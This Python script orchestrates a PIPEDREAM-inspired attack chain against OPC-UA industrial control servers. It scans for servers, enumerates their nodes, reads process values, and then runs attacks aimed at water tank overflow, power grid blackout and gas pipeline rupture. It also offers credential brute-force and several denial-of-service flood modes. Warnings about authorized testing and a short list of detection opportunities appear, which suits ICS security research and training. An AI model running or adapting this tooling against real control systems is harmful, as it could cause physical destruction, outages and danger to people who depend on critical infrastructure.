#!/usr/bin/env python3
"""
PIPEDREAM-Inspired Attack Simulation for OPC-UA Control Systems

Simulates PIPEDREAM (INCONTROLLER) attack patterns against OPC-UA servers.
Based on the 2022 discovery by Dragos of this ICS-targeted malware framework.

Original PIPEDREAM capabilities:
- Device fingerprinting and enumeration
- OPC-UA server exploitation
- PLC logic manipulation
- Codesys protocol attacks
- OMRON FINS protocol attacks

This simulation focuses on the OPC-UA attack vector targeting:
- Water Tank (overflow/explosion)
- Power Grid (blackout)
- Gas Pipeline (overpressure/rupture)

Usage:
    python pipedream_simulation.py --target 127.0.0.1
    python pipedream_simulation.py --target 192.168.1.6 --attack water_tank
    python pipedream_simulation.py --target 192.168.1.6 --attack all

WARNING: This is a SIMULATION for educational/security testing purposes only.
         Only use against authorized test systems.
"""

import os
import sys
import time
import argparse
import logging
from datetime import datetime
from typing import List, Dict, Any

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from .mousehole import OPCUAScanner, AttackResult, OPCUAFingerprinter, OPCUABruteforcer, OPCUADoS
    from .attack_water_tank import AttackWaterTank
    from .attack_power_grid import AttackPowerGrid
    from .attack_gas_pipeline import AttackGasPipeline
except ImportError:
    from mousehole import OPCUAScanner, AttackResult, OPCUAFingerprinter, OPCUABruteforcer, OPCUADoS
    from attack_water_tank import AttackWaterTank
    from attack_power_grid import AttackPowerGrid
    from attack_gas_pipeline import AttackGasPipeline

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [PIPEDREAM] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('PIPEDREAM')


class PIPEDREAMSimulation:
    """
    PIPEDREAM Attack Chain Orchestrator

    Executes multi-phase attack sequence:
    1. Discovery - Scan network for OPC-UA servers
    2. Enumeration - Browse OPC-UA node tree
    3. Reconnaissance - Read all node values
    4. Attack Preparation - Identify writable command nodes
    5. Attack Execution - Manipulate nodes to cause damage
    """

    ATTACKS = {
        'water_tank': AttackWaterTank,
        'power_grid': AttackPowerGrid,
        'gas_pipeline': AttackGasPipeline
    }

    def __init__(self, target: str, port: int = 4840):
        """
        Initialize PIPEDREAM simulation

        Args:
            target: Target OPC-UA server IP
            port: OPC-UA port
        """
        self.target = target
        self.port = port
        self.scanner = OPCUAScanner()
        self.attack_results: List[AttackResult] = []
        self.start_time = None

    def banner(self):
        """Display PIPEDREAM banner"""
        print("\n" + "=" * 70)
        print(" " * 15 + "PIPEDREAM ATTACK SIMULATION")
        print(" " * 10 + "(INCONTROLLER OPC-UA Attack Framework)")
        print("=" * 70)
        print(f"  Target:      {self.target}:{self.port}")
        print(f"  Endpoint:    opc.tcp://{self.target}:{self.port}/freeopcua/server/")
        print(f"  Timestamp:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print("\nPIPEDREAM Background:")
        print("  - Discovered by Dragos in 2022")
        print("  - Targets Schneider Electric and OMRON PLCs")
        print("  - Uses OPC-UA, Codesys, and FINS protocols")
        print("  - Capable of device enumeration and manipulation")
        print("  - State-sponsored threat (attributed to CHERNOVITE)")
        print("=" * 70)
        print("\nWARNING: For authorized security testing only!")
        print("=" * 70 + "\n")

    def phase1_discovery(self) -> bool:
        """
        Phase 1: Discovery

        Scan network for OPC-UA servers
        """
        logger.info("=" * 60)
        logger.info("[PHASE 1] DISCOVERY")
        logger.info("=" * 60)

        logger.info(f"[*] Scanning {self.target} for ICS protocol ports...")

        # Port scan for ICS protocols
        results = self.scanner.port_scan(self.target)

        # Check for OPC-UA
        opcua_found = any(r.port == 4840 and r.open for r in results)

        if opcua_found:
            logger.warning(f"[!] OPC-UA server detected at {self.target}:{self.port}")
            return True
        else:
            logger.error(f"[-] No OPC-UA server found at {self.target}")
            return False

    def phase2_enumeration(self) -> bool:
        """
        Phase 2: Enumeration

        Enumerate OPC-UA server and node tree
        """
        logger.info("\n" + "=" * 60)
        logger.info("[PHASE 2] ENUMERATION")
        logger.info("=" * 60)

        logger.info(f"[*] Enumerating OPC-UA server...")

        server_info = self.scanner.enumerate_opcua(self.target, self.port)

        if server_info:
            logger.warning("[!] OPC-UA Server Enumeration Complete")
            logger.info(f"    Endpoint: {server_info.endpoint}")
            logger.info(f"    Namespaces: {server_info.namespaces}")

            if server_info.nodes:
                logger.warning("[!] Industrial processes discovered:")
                for process, categories in server_info.nodes.items():
                    node_count = sum(len(nodes) for nodes in categories.values())
                    logger.info(f"    - {process}: {node_count} nodes")
                    for category, nodes in categories.items():
                        logger.debug(f"      {category}: {nodes}")
            return True
        else:
            logger.error("[-] Failed to enumerate OPC-UA server")
            return False

    def phase3_reconnaissance(self) -> Dict[str, Any]:
        """
        Phase 3: Reconnaissance

        Read all values from discovered processes
        """
        logger.info("\n" + "=" * 60)
        logger.info("[PHASE 3] RECONNAISSANCE")
        logger.info("=" * 60)

        logger.info("[*] Reading current process states...")

        recon_data = {}

        # Use a temporary attack instance just for reading
        for process_name, attack_class in self.ATTACKS.items():
            try:
                attack = attack_class(self.target, self.port)
                if attack.connect():
                    measurements = attack.read_all_measurements()
                    status = attack.read_all_status()
                    attack.disconnect()

                    recon_data[process_name] = {
                        'measurements': measurements,
                        'status': status
                    }

                    logger.info(f"\n    [{process_name.upper()}]")
                    logger.info(f"    Measurements: {measurements}")
                    logger.info(f"    Status: {status}")

            except Exception as e:
                logger.debug(f"Could not read {process_name}: {e}")

        return recon_data

    def phase4_attack_preparation(self, targets: List[str]) -> List[str]:
        """
        Phase 4: Attack Preparation

        Identify attack targets and validate
        """
        logger.info("\n" + "=" * 60)
        logger.info("[PHASE 4] ATTACK PREPARATION")
        logger.info("=" * 60)

        available_attacks = []

        for target in targets:
            if target in self.ATTACKS:
                available_attacks.append(target)
                logger.info(f"[+] Attack prepared: {target}")
            else:
                logger.warning(f"[-] Unknown attack target: {target}")

        if available_attacks:
            logger.warning(f"\n[!] {len(available_attacks)} attack(s) ready for execution")
            for attack in available_attacks:
                attack_class = self.ATTACKS[attack]
                instance = attack_class(self.target, self.port)
                logger.info(f"    - {instance.get_attack_name()}")
        else:
            logger.error("[-] No valid attacks prepared")

        return available_attacks

    def phase5_attack_execution(self, attacks: List[str]) -> List[AttackResult]:
        """
        Phase 5: Attack Execution

        Execute selected attacks
        """
        logger.info("\n" + "=" * 60)
        logger.info("[PHASE 5] ATTACK EXECUTION")
        logger.info("=" * 60)

        results = []

        for attack_name in attacks:
            logger.warning(f"\n[!] Executing attack: {attack_name}")

            attack_class = self.ATTACKS[attack_name]
            attack = attack_class(self.target, self.port)

            result = attack.run()
            results.append(result)

            if result.success:
                logger.warning(f"[+] Attack completed: {result.attack_type}")
            else:
                logger.error(f"[-] Attack failed: {result.error}")

            # Delay between attacks
            if attack_name != attacks[-1]:
                logger.info("\n[*] Waiting before next attack...")
                time.sleep(3)

        self.attack_results = results
        return results

    def run(self, attacks: List[str] = None, skip_discovery: bool = False) -> bool:
        """
        Run complete PIPEDREAM attack simulation

        Args:
            attacks: List of attack names to execute
            skip_discovery: Skip discovery/enumeration phases

        Returns:
            True if attacks executed successfully
        """
        self.banner()
        self.start_time = time.time()

        if attacks is None:
            attacks = ['water_tank']  # Default to water tank attack

        if 'all' in attacks:
            attacks = list(self.ATTACKS.keys())

        try:
            if not skip_discovery:
                # Phase 1: Discovery
                if not self.phase1_discovery():
                    logger.error("[!] Discovery failed - aborting")
                    return False
                time.sleep(2)

                # Phase 2: Enumeration
                if not self.phase2_enumeration():
                    logger.warning("[!] Enumeration failed - continuing anyway")
                time.sleep(2)

                # Phase 3: Reconnaissance
                self.phase3_reconnaissance()
                time.sleep(2)

            # Phase 4: Attack Preparation
            valid_attacks = self.phase4_attack_preparation(attacks)
            if not valid_attacks:
                logger.error("[!] No valid attacks - aborting")
                return False
            time.sleep(2)

            # Phase 5: Attack Execution
            results = self.phase5_attack_execution(valid_attacks)

            # Print Summary
            self.print_summary()

            return any(r.success for r in results)

        except KeyboardInterrupt:
            logger.warning("\n[!] Simulation interrupted by user")
            return False
        except Exception as e:
            logger.error(f"[!] Simulation error: {e}")
            import traceback
            traceback.print_exc()
            return False

    def print_summary(self):
        """Print attack summary"""
        duration = time.time() - self.start_time if self.start_time else 0

        print("\n" + "=" * 70)
        print(" " * 20 + "ATTACK SUMMARY")
        print("=" * 70)
        print(f"  Target:        {self.target}:{self.port}")
        print(f"  Duration:      {duration:.1f} seconds")
        print(f"  Attacks:       {len(self.attack_results)}")

        successful = sum(1 for r in self.attack_results if r.success)
        print(f"  Successful:    {successful}/{len(self.attack_results)}")

        print("\nResults:")
        for result in self.attack_results:
            status = "SUCCESS" if result.success else "FAILED"
            print(f"\n  [{status}] {result.attack_type}")
            print(f"    Process: {result.process}")
            print(f"    Commands: {result.commands_sent}")
            print(f"    Effect: {result.expected_effect}")
            if result.error:
                print(f"    Error: {result.error}")

        print("\n" + "=" * 70)
        print("Detection Opportunities:")
        print("  - OPC-UA enumeration activity")
        print("  - Unauthorized OPC-UA connections")
        print("  - Rapid control command sequences")
        print("  - Safety system disabling")
        print("  - Abnormal process parameters")
        print("=" * 70 + "\n")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='PIPEDREAM Attack Simulation for OPC-UA Systems',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Available Attacks:
  water_tank    - Tank overflow/explosion attack
  power_grid    - Power grid blackout attack
  gas_pipeline  - Pipeline overpressure/rupture attack
  all           - Execute all attacks

Additional Modes:
  --fingerprint - Run server fingerprinting only
  --bruteforce  - Run credential brute-force attack
  --dos TYPE    - Run DoS attack (connection/read/browse/subscription/malformed)

Examples:
  # Scan and attack water tank
  python pipedream_simulation.py --target 192.168.1.6

  # Fingerprint server first
  python pipedream_simulation.py --target 192.168.1.6 --fingerprint

  # Brute-force credentials
  python pipedream_simulation.py --target 192.168.1.6 --bruteforce

  # Run DoS attack
  python pipedream_simulation.py --target 192.168.1.6 --dos connection --duration 30

  # Attack power grid only (skip discovery)
  python pipedream_simulation.py --target 192.168.1.6 --attack power_grid --skip-discovery

  # Execute all attacks
  python pipedream_simulation.py --target 192.168.1.6 --attack all

WARNING: Only use against authorized test systems!
        """
    )

    parser.add_argument('--target', '-t', default='192.168.1.6',
                        help='Target OPC-UA server IP (default: 192.168.1.6)')
    parser.add_argument('--port', '-p', type=int, default=4840,
                        help='OPC-UA port (default: 4840)')
    parser.add_argument('--attack', '-a', action='append',
                        help='Attack(s) to execute (can specify multiple)')
    parser.add_argument('--skip-discovery', action='store_true',
                        help='Skip discovery and enumeration phases')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose output')

    # New PIPEDREAM enhancement modes
    parser.add_argument('--fingerprint', action='store_true',
                        help='Run server fingerprinting and reconnaissance')
    parser.add_argument('--bruteforce', action='store_true',
                        help='Run credential brute-force attack')
    parser.add_argument('--dos', choices=['connection', 'read', 'browse', 'subscription', 'malformed'],
                        help='Run DoS attack of specified type')
    parser.add_argument('--duration', type=int, default=30,
                        help='Duration for DoS attacks in seconds (default: 30)')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of threads for DoS attacks (default: 5)')

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Handle fingerprint mode - does NOT exit so --fingerprint + --attack can coexist
    if args.fingerprint:
        import asyncio
        fingerprinter = OPCUAFingerprinter(args.target, args.port)
        asyncio.run(fingerprinter.fingerprint_server())
        if not args.attack and not args.bruteforce and not args.dos:
            sys.exit(0)
        # else fall through to attack phase

    # Handle bruteforce mode
    if args.bruteforce:
        import asyncio
        bruteforcer = OPCUABruteforcer(args.target, args.port)
        asyncio.run(bruteforcer.run_bruteforce())
        sys.exit(0)

    # Handle DoS mode
    if args.dos:
        import asyncio
        dos = OPCUADoS(args.target, args.port)

        async def run_dos():
            if args.dos == 'connection':
                await dos.connection_flood(args.duration, args.threads)
            elif args.dos == 'read':
                await dos.read_flood(args.duration, args.threads)
            elif args.dos == 'browse':
                await dos.browse_flood(args.duration, args.threads)
            elif args.dos == 'subscription':
                await dos.subscription_flood(args.duration)
            elif args.dos == 'malformed':
                await dos.malformed_packet_attack(args.duration)

        asyncio.run(run_dos())
        sys.exit(0)

    # Default to water tank if no attack specified
    attacks = args.attack if args.attack else ['water_tank']

    # Create and run simulation
    sim = PIPEDREAMSimulation(args.target, args.port)
    success = sim.run(attacks=attacks, skip_discovery=args.skip_discovery)

    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
